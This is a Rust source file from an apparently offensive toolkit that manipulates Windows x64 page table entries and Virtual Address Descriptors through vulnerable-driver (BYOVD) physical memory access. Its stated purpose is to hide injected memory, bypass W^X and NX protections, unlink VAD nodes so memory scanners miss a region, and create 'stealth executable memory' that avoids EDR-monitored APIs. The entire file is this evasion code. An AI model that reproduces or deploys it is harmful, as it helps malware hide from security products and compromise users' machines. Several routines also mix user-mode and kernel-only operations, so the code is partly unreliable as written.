//! Page Table Entry (PTE) and Virtual Address Descriptor (VAD) Manipulation
//!
//! Core techniques:
//! 1. PTE modification: change page protection (read-only to writable, disable NX)
//! 2. PDE/PML4 modification: map arbitrary physical pages to virtual space
//! 3. VAD modification: hide memory regions, change region protection
//!
//! Use cases:
//! - Hide injected memory pages
//! - Bypass W^X protection
//! - Create undetectable memory regions

use crate::error::MemoricError;
use serde_json::Value;

/// x64 Page Table Entry structure
///
/// PTE layout (64-bit):
/// Bits 0-11: Flags (P, R/W, U/S, PWT, PCD, A, D, PAT, G, etc.)
/// Bits 12-35: Physical Page Number (PPN) - 4KB pages
/// Bits 36-47: Reserved
/// Bits 48-63: Sign extension
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct PageTableEntry(pub u64);

impl PageTableEntry {
    /// Present bit
    pub const PRESENT: u64 = 1 << 0;
    /// Read/Write bit
    pub const RW: u64 = 1 << 1;
    /// User/Supervisor bit
    pub const USER: u64 = 1 << 2;
    /// Write Through
    pub const PWT: u64 = 1 << 3;
    /// Cache Disable
    pub const PCD: u64 = 1 << 4;
    /// Accessed
    pub const ACCESSED: u64 = 1 << 5;
    /// Dirty
    pub const DIRTY: u64 = 1 << 6;
    /// Page Attribute Table
    pub const PAT: u64 = 1 << 7;
    /// Global
    pub const GLOBAL: u64 = 1 << 8;
    /// No Execute (NX)
    pub const NX: u64 = 1 << 63;

    /// Physical Page Number mask
    pub const PPN_MASK: u64 = 0x0000FFFFFFFFF000;

    pub fn is_present(&self) -> bool {
        self.0 & Self::PRESENT != 0
    }

    pub fn is_writable(&self) -> bool {
        self.0 & Self::RW != 0
    }

    pub fn is_executable(&self) -> bool {
        self.0 & Self::NX == 0
    }

    pub fn physical_address(&self) -> u64 {
        self.0 & Self::PPN_MASK
    }

    pub fn set_writable(&mut self, writable: bool) {
        if writable {
            self.0 |= Self::RW;
        } else {
            self.0 &= !Self::RW;
        }
    }

    pub fn set_executable(&mut self, executable: bool) {
        if executable {
            self.0 &= !Self::NX;
        } else {
            self.0 |= Self::NX;
        }
    }

    pub fn set_physical(&mut self, physical: u64) {
        self.0 = (self.0 & !Self::PPN_MASK) | (physical & Self::PPN_MASK);
    }
}

/// Virtual address decomposition
#[derive(Debug, Clone)]
pub struct VirtualAddress {
    pub value: usize,
    pub pml4_index: u16,
    pub pdpt_index: u16,
    pub pd_index: u16,
    pub pt_index: u16,
    pub page_offset: u16,
}

impl VirtualAddress {
    pub fn new(addr: usize) -> Self {
        Self {
            value: addr,
            pml4_index: ((addr >> 39) & 0x1FF) as u16,
            pdpt_index: ((addr >> 30) & 0x1FF) as u16,
            pd_index: ((addr >> 21) & 0x1FF) as u16,
            pt_index: ((addr >> 12) & 0x1FF) as u16,
            page_offset: (addr & 0xFFF) as u16,
        }
    }

    /// Compute PTE virtual address for each level (using self-mapping technique)
    ///
    /// Requires knowing the PML4 self-map entry index (typically 0x1ED or similar)
    pub fn pte_address(&self, selfmap_idx: u16) -> usize {
        // Self-mapping formula:
        // PTE = 0xFFFF000000000000 | (selfmap_idx << 39) | (selfmap_idx << 30) |
        //       (selfmap_idx << 21) | (selfmap_idx << 12) | (va >> 9)

        let base = 0xFFFF_0000_0000_0000usize;
        let idx = selfmap_idx as usize;
        let va_part = self.value >> 9;

        base | (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12) | va_part
    }
}

/// Page table manipulator
pub struct PageTableManipulator {
    /// CR3 register value (page table base)
    pub cr3: u64,
    /// PML4 self-map index
    pub selfmap_index: u16,
}

impl PageTableManipulator {
    /// Create a new page table manipulator
    ///
    /// # Safety
    /// Requires kernel access privileges
    pub unsafe fn new() -> Result<Self, MemoricError> {
        let cr3 = Self::read_cr3();

        Ok(Self {
            cr3,
            selfmap_index: 0x1ED, // Common self-map index
        })
    }

    /// Read the CR3 register
    unsafe fn read_cr3() -> u64 {
        let cr3: u64;
        std::arch::asm!(
            "mov {}, cr3",
            out(reg) cr3,
            options(nomem, nostack)
        );
        cr3
    }

    /// Get the PTE address for a virtual address
    pub fn get_pte_address(&self, virtual_addr: usize) -> usize {
        let va = VirtualAddress::new(virtual_addr);
        va.pte_address(self.selfmap_index)
    }

    /// Modify page protection attributes
    ///
    /// Make read-only pages writable or disable NX execution protection.
    /// Uses BYOVD physical memory access to modify PTE directly.
    ///
    /// # Safety
    /// Requires kernel write access via BYOVD
    pub unsafe fn modify_page_protection(
        &self,
        virtual_addr: usize,
        writable: Option<bool>,
        executable: Option<bool>,
    ) -> Result<Value, MemoricError> {
        // Walk the page table to find the PTE physical address
        let va = VirtualAddress::new(virtual_addr);
        let pte_phys = self.walk_to_pte_physical(&va)?;

        // Read current PTE
        let pte_bytes = super::physical_memory::read_physical_memory(pte_phys, 8)?;
        let mut pte = PageTableEntry(u64::from_le_bytes(pte_bytes[..8].try_into().unwrap()));

        if !pte.is_present() {
            return Err(MemoricError::Other("PTE not present".to_string()));
        }

        let old_pte = pte.0;

        if let Some(w) = writable {
            pte.set_writable(w);
        }
        if let Some(x) = executable {
            pte.set_executable(x);
        }

        // Write modified PTE back
        super::physical_memory::write_physical_memory(pte_phys, &pte.0.to_le_bytes())?;

        // Flush TLB for this address (user-mode INVLPG via volatile access)
        std::arch::asm!("invlpg [{}]", in(reg) virtual_addr, options(nostack, preserves_flags));

        tracing::info!(
            "[PTE] Modified protection for 0x{:016X}: 0x{:016X} -> 0x{:016X}",
            virtual_addr,
            old_pte,
            pte.0
        );

        Ok(serde_json::json!({
            "success": true,
            "virtual_address": format!("0x{:016X}", virtual_addr),
            "pte_physical": format!("0x{:016X}", pte_phys),
            "old_pte": format!("0x{:016X}", old_pte),
            "new_pte": format!("0x{:016X}", pte.0),
        }))
    }

    /// Walk the 4-level page table to find the PTE physical address for a VA
    unsafe fn walk_to_pte_physical(&self, va: &VirtualAddress) -> Result<u64, MemoricError> {
        const PTE_ADDR_MASK: u64 = 0x0000_FFFF_FFFF_F000;

        // Level 4: PML4
        let pml4e_addr = (self.cr3 & PTE_ADDR_MASK) + (va.pml4_index as u64 * 8);
        let pml4e_bytes = super::physical_memory::read_physical_memory(pml4e_addr, 8)?;
        let pml4e = u64::from_le_bytes(pml4e_bytes[..8].try_into().unwrap());
        if pml4e & 1 == 0 {
            return Err(MemoricError::Other("PML4E not present".to_string()));
        }

        // Level 3: PDPT
        let pdpte_addr = (pml4e & PTE_ADDR_MASK) + (va.pdpt_index as u64 * 8);
        let pdpte_bytes = super::physical_memory::read_physical_memory(pdpte_addr, 8)?;
        let pdpte = u64::from_le_bytes(pdpte_bytes[..8].try_into().unwrap());
        if pdpte & 1 == 0 {
            return Err(MemoricError::Other("PDPTE not present".to_string()));
        }
        if pdpte & (1 << 7) != 0 {
            return Err(MemoricError::Other(
                "1GB huge page - no PTE level".to_string(),
            ));
        }

        // Level 2: PD
        let pde_addr = (pdpte & PTE_ADDR_MASK) + (va.pd_index as u64 * 8);
        let pde_bytes = super::physical_memory::read_physical_memory(pde_addr, 8)?;
        let pde = u64::from_le_bytes(pde_bytes[..8].try_into().unwrap());
        if pde & 1 == 0 {
            return Err(MemoricError::Other("PDE not present".to_string()));
        }
        if pde & (1 << 7) != 0 {
            return Err(MemoricError::Other(
                "2MB large page - no PTE level".to_string(),
            ));
        }

        // Level 1: PT (return the physical address of the PTE itself)
        let pte_addr = (pde & PTE_ADDR_MASK) + (va.pt_index as u64 * 8);
        Ok(pte_addr)
    }

    /// Create a dual mapping
    ///
    /// Map the same physical page to two different virtual addresses:
    /// one executable, one writable (bypass W^X).
    /// Requires BYOVD physical memory access and an available PTE slot.
    pub unsafe fn create_dual_mapping(
        &self,
        physical_addr: u64,
        writable_va: usize,
        executable_va: usize,
    ) -> Result<Value, MemoricError> {
        tracing::info!(
            "[PTE] Creating dual mapping: PA 0x{:016X} -> WA 0x{:016X}, XA 0x{:016X}",
            physical_addr,
            writable_va,
            executable_va
        );

        // Modify PTE for writable VA: set RW, set NX
        let wa_va = VirtualAddress::new(writable_va);
        let wa_pte_phys = self.walk_to_pte_physical(&wa_va)?;
        let mut wa_pte =
            PageTableEntry(PageTableEntry::PRESENT | PageTableEntry::RW | PageTableEntry::NX);
        wa_pte.set_physical(physical_addr);
        super::physical_memory::write_physical_memory(wa_pte_phys, &wa_pte.0.to_le_bytes())?;

        // Modify PTE for executable VA: clear RW, clear NX
        let xa_va = VirtualAddress::new(executable_va);
        let xa_pte_phys = self.walk_to_pte_physical(&xa_va)?;
        let mut xa_pte = PageTableEntry(PageTableEntry::PRESENT);
        xa_pte.set_physical(physical_addr);
        super::physical_memory::write_physical_memory(xa_pte_phys, &xa_pte.0.to_le_bytes())?;

        // Flush TLB
        std::arch::asm!("invlpg [{}]", in(reg) writable_va, options(nostack, preserves_flags));
        std::arch::asm!("invlpg [{}]", in(reg) executable_va, options(nostack, preserves_flags));

        Ok(serde_json::json!({
            "success": true,
            "physical_address": format!("0x{:016X}", physical_addr),
            "writable_va": format!("0x{:016X}", writable_va),
            "executable_va": format!("0x{:016X}", executable_va),
            "message": "Dual mapping created: write to WA, execute from XA"
        }))
    }

    /// Hide a memory page
    ///
    /// Clears the Present bit to hide the page from the CPU.
    /// The page remains in physical memory but becomes invisible.
    pub unsafe fn hide_page(&self, virtual_addr: usize) -> Result<(), MemoricError> {
        let va = VirtualAddress::new(virtual_addr);
        let pte_phys = self.walk_to_pte_physical(&va)?;

        // Read current PTE
        let pte_bytes = super::physical_memory::read_physical_memory(pte_phys, 8)?;
        let mut pte_val = u64::from_le_bytes(pte_bytes[..8].try_into().unwrap());

        // Clear Present bit
        pte_val &= !PageTableEntry::PRESENT;

        // Write back
        super::physical_memory::write_physical_memory(pte_phys, &pte_val.to_le_bytes())?;

        // Flush TLB
        std::arch::asm!("invlpg [{}]", in(reg) virtual_addr, options(nostack, preserves_flags));

        tracing::warn!("[PTE] Page hidden at 0x{:016X}", virtual_addr);
        Ok(())
    }
}

/// VAD (Virtual Address Descriptor) manipulation
///
/// VAD is a red-black tree node in the Windows kernel describing virtual memory regions.
/// Modifying VAD entries can hide memory regions or change their attributes.
pub struct VadManipulator;

/// EPROCESS.VadRoot offset (varies by Windows version)
pub const VADROOT_OFFSET: u64 = 0x658; // Common Win10+ value

/// MMVAD_SHORT structure key offsets
#[derive(Debug, Clone)]
pub struct VadOffsets {
    pub starting_vpn: u64, // Starting virtual page number
    pub ending_vpn: u64,   // Ending virtual page number
    pub protection: u64,   // Protection attribute
    pub flags: u64,        // Various flags
}

impl VadManipulator {
    /// Find VAD nodes covering the specified address range
    ///
    /// Walks the EPROCESS.VadRoot red-black tree via BYOVD physical memory reads
    pub fn find_vad_range(
        eprocess: u64,
        start_va: usize,
        end_va: usize,
    ) -> Result<Vec<u64>, MemoricError> {
        // Read VadRoot from EPROCESS
        let vad_root_addr = eprocess + VADROOT_OFFSET;
        let root_bytes = super::physical_memory::read_physical_memory(vad_root_addr, 8)?;
        let root_node = u64::from_le_bytes(root_bytes[..8].try_into().unwrap());

        if root_node == 0 {
            return Ok(Vec::new());
        }

        let start_vpn = (start_va >> 12) as u64;
        let end_vpn = (end_va >> 12) as u64;

        tracing::info!(
            "[VAD] Searching VAD tree at EPROCESS 0x{:016X} for VPN range 0x{:X}-0x{:X}",
            eprocess,
            start_vpn,
            end_vpn
        );

        // Walk the red-black tree (iterative in-order traversal)
        let mut result = Vec::new();
        let mut stack = vec![root_node];
        let mut visited = std::collections::HashSet::new();

        while let Some(node) = stack.pop() {
            if node == 0 || visited.contains(&node) {
                continue;
            }
            visited.insert(node);

            // MMVAD_SHORT layout (Win10+):
            // +0x00: VadNode (RTL_BALANCED_NODE: Left, Right, ParentValue)
            // +0x18: StartingVpn (ULONG)
            // +0x1C: EndingVpn (ULONG)
            // +0x20: StartingVpnHigh (UCHAR)
            // +0x21: EndingVpnHigh (UCHAR)

            match super::physical_memory::read_physical_memory(node, 0x28) {
                Ok(data) if data.len() >= 0x28 => {
                    let left = u64::from_le_bytes(data[0..8].try_into().unwrap());
                    let right = u64::from_le_bytes(data[8..16].try_into().unwrap());
                    let svpn_low = u32::from_le_bytes(data[0x18..0x1C].try_into().unwrap()) as u64;
                    let evpn_low = u32::from_le_bytes(data[0x1C..0x20].try_into().unwrap()) as u64;
                    let svpn_high = data[0x20] as u64;
                    let evpn_high = data[0x21] as u64;

                    let svpn = svpn_low | (svpn_high << 32);
                    let evpn = evpn_low | (evpn_high << 32);

                    // Check overlap with requested range
                    if svpn <= end_vpn && evpn >= start_vpn {
                        result.push(node);
                    }

                    // Continue tree traversal
                    if left != 0 {
                        stack.push(left);
                    }
                    if right != 0 {
                        stack.push(right);
                    }
                }
                _ => {}
            }

            if visited.len() > 4096 {
                break; // Safety limit
            }
        }

        Ok(result)
    }

    /// Modify VAD protection attribute
    ///
    /// More stealthy than PTE modification since VAD is a higher-level descriptor
    pub fn modify_vad_protection(vad_node: u64, new_protection: u32) -> Result<(), MemoricError> {
        tracing::warn!("[VAD] Modifying VAD protection at node 0x{:016X}", vad_node);

        // MMVAD_SHORT.Flags offset = 0x30 on Win10+
        // Protection field is bits 5-9 of the Flags ULONG
        let flags_addr = vad_node + 0x30;
        let flags_bytes = super::physical_memory::read_physical_memory(flags_addr, 4)?;
        let mut flags = u32::from_le_bytes(flags_bytes[..4].try_into().unwrap());

        // Clear old protection bits (5-9) and set new ones
        flags &= !(0x1F << 5);
        flags |= (new_protection & 0x1F) << 5;

        super::physical_memory::write_physical_memory(flags_addr, &flags.to_le_bytes())?;

        tracing::info!("[VAD] Protection modified to {}", new_protection);
        Ok(())
    }

    /// Unlink a VAD node from the tree (hide a memory region)
    ///
    /// This makes the region invisible to VirtualQuery, memory scanners, etc.
    /// WARNING: May cause instability if the region is still in use.
    pub fn unlink_vad_node(vad_node: u64) -> Result<(), MemoricError> {
        tracing::warn!("[VAD] Unlinking VAD node 0x{:016X} - HIGH RISK", vad_node);

        // Read RTL_BALANCED_NODE: Left (0x00), Right (0x08), ParentValue (0x10)
        let node_bytes = super::physical_memory::read_physical_memory(vad_node, 0x18)?;
        let left = u64::from_le_bytes(node_bytes[0..8].try_into().unwrap());
        let right = u64::from_le_bytes(node_bytes[8..16].try_into().unwrap());
        let parent_val = u64::from_le_bytes(node_bytes[16..24].try_into().unwrap());
        let parent = parent_val & !3; // Clear red-black color bits

        if parent == 0 {
            return Err(MemoricError::Other(
                "Cannot unlink root VAD node".to_string(),
            ));
        }

        // Simple unlink: if it's a leaf node, zero the parent's pointer to us
        if left == 0 && right == 0 {
            // Read parent's Left and Right to find which pointer to clear
            let parent_bytes = super::physical_memory::read_physical_memory(parent, 0x10)?;
            let parent_left = u64::from_le_bytes(parent_bytes[0..8].try_into().unwrap());
            let parent_right = u64::from_le_bytes(parent_bytes[8..16].try_into().unwrap());

            let zero = 0u64.to_le_bytes();
            if parent_left == vad_node {
                super::physical_memory::write_physical_memory(parent, &zero)?;
            } else if parent_right == vad_node {
                super::physical_memory::write_physical_memory(parent + 8, &zero)?;
            }

            tracing::info!("[VAD] Leaf node unlinked successfully");
            return Ok(());
        }

        // For non-leaf nodes, replace with successor (right subtree minimum)
        // This is complex for a full RB-tree rebalance. For safety, only support leaf unlinking.
        Err(MemoricError::Other(
            "Non-leaf VAD unlinking not supported (risk of RB-tree corruption)".to_string(),
        ))
    }
}

/// Page table entry protection values (Windows constants)
#[repr(u32)]
#[derive(Debug, Clone, Copy)]
pub enum MmProtection {
    NoAccess = 0x00,
    ReadOnly = 0x01,
    Execute = 0x02,
    ExecuteRead = 0x03,
    ReadWrite = 0x04,
    WriteCopy = 0x05,
    ExecuteReadWrite = 0x06,
    ExecuteWriteCopy = 0x07,
}

/// Brute-force PTE scan
///
/// Search kernel memory for valid page table entries
pub unsafe fn brute_force_pte_scan(
    start_pfn: u64,
    count: u64,
) -> Result<Vec<(u64, PageTableEntry)>, MemoricError> {
    let mut valid_ptes = Vec::new();

    for pfn in start_pfn..start_pfn + count {
        let physical_addr = pfn * 0x1000;

        // 尝试读取物理页
        match super::physical_memory::read_physical_memory(physical_addr, 8) {
            Ok(data) if data.len() == 8 => {
                let value = u64::from_le_bytes([
                    data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7],
                ]);

                let pte = PageTableEntry(value);

                // Check if this looks like a valid PTE
                if pte.is_present() && pte.physical_address() != 0 {
                    // Extra validation: physical address should be in reasonable range
                    let pa = pte.physical_address();
                    if pa < 0x10000000000 {
                        // 1TB 限制
                        valid_ptes.push((physical_addr, pte));
                    }
                }
            }
            _ => {}
        }
    }

    Ok(valid_ptes)
}

/// Virtual address to physical address translation (software walk)
///
/// Manually walks the page table hierarchy
pub fn translate_virtual_to_physical(cr3: u64, virtual_addr: usize) -> Result<u64, MemoricError> {
    let va = VirtualAddress::new(virtual_addr);
    const PTE_ADDR_MASK: u64 = 0x0000_FFFF_FFFF_F000;

    tracing::debug!(
        "[PTE] Translating VA 0x{:016X}: PML4={:#x} PDPT={:#x} PD={:#x} PT={:#x}",
        virtual_addr,
        va.pml4_index,
        va.pdpt_index,
        va.pd_index,
        va.pt_index
    );

    // PML4
    let pml4e_addr = (cr3 & PTE_ADDR_MASK) + (va.pml4_index as u64 * 8);
    let pml4e_bytes = super::physical_memory::read_physical_memory(pml4e_addr, 8)?;
    let pml4e = u64::from_le_bytes(pml4e_bytes[..8].try_into().unwrap());
    if pml4e & 1 == 0 {
        return Err(MemoricError::Other("PML4E not present".to_string()));
    }

    // PDPT
    let pdpte_addr = (pml4e & PTE_ADDR_MASK) + (va.pdpt_index as u64 * 8);
    let pdpte_bytes = super::physical_memory::read_physical_memory(pdpte_addr, 8)?;
    let pdpte = u64::from_le_bytes(pdpte_bytes[..8].try_into().unwrap());
    if pdpte & 1 == 0 {
        return Err(MemoricError::Other("PDPTE not present".to_string()));
    }
    if pdpte & (1 << 7) != 0 {
        return Ok((pdpte & 0x0000_FFFF_C000_0000) | (virtual_addr as u64 & 0x3FFF_FFFF));
    }

    // PD
    let pde_addr = (pdpte & PTE_ADDR_MASK) + (va.pd_index as u64 * 8);
    let pde_bytes = super::physical_memory::read_physical_memory(pde_addr, 8)?;
    let pde = u64::from_le_bytes(pde_bytes[..8].try_into().unwrap());
    if pde & 1 == 0 {
        return Err(MemoricError::Other("PDE not present".to_string()));
    }
    if pde & (1 << 7) != 0 {
        return Ok((pde & 0x0000_FFFF_FFE0_0000) | (virtual_addr as u64 & 0x1F_FFFF));
    }

    // PT
    let pte_addr = (pde & PTE_ADDR_MASK) + (va.pt_index as u64 * 8);
    let pte_bytes = super::physical_memory::read_physical_memory(pte_addr, 8)?;
    let pte = u64::from_le_bytes(pte_bytes[..8].try_into().unwrap());
    if pte & 1 == 0 {
        return Err(MemoricError::Other("PTE not present".to_string()));
    }

    Ok((pte & PTE_ADDR_MASK) | (va.page_offset as u64))
}

/// Create stealth executable memory
///
/// Creates undetectable executable memory by manipulating page table entries
pub unsafe fn create_stealth_executable_memory(size: usize) -> Result<usize, MemoricError> {
    if size > 0x100000 {
        return Err(MemoricError::Other("Size too large (max 1MB)".to_string()));
    }

    tracing::warn!("[PTE] Creating stealth executable memory ({} bytes)", size);

    use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

    // Step 1: Allocate RW memory (appears benign to scanners)
    let mem = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() {
        return Err(MemoricError::WindowsApi("VirtualAlloc failed".to_string()));
    }

    let addr = mem as usize;

    // Step 2: Use the page table manipulator to clear NX bit on the PTE
    // This makes the page executable without VirtualProtect (which EDRs monitor)
    let manipulator = PageTableManipulator::new()?;

    // Process each page in the allocation
    let num_pages = (size + 0xFFF) / 0x1000;
    for i in 0..num_pages {
        let page_addr = addr + i * 0x1000;
        let va = VirtualAddress::new(page_addr);

        match manipulator.walk_to_pte_physical(&va) {
            Ok(pte_phys) => {
                let pte_bytes = super::physical_memory::read_physical_memory(pte_phys, 8)?;
                let mut pte =
                    PageTableEntry(u64::from_le_bytes(pte_bytes[..8].try_into().unwrap()));

                // Clear NX bit to make executable
                pte.set_executable(true);

                super::physical_memory::write_physical_memory(pte_phys, &pte.0.to_le_bytes())?;
                std::arch::asm!("invlpg [{}]", in(reg) page_addr, options(nostack, preserves_flags));
            }
            Err(e) => {
                tracing::warn!(
                    "[PTE] Failed to modify PTE for page 0x{:016X}: {}",
                    page_addr,
                    e
                );
            }
        }
    }

    tracing::info!(
        "[PTE] Stealth executable memory created at 0x{:016X} ({} pages)",
        addr,
        num_pages
    );

    Ok(addr)
}
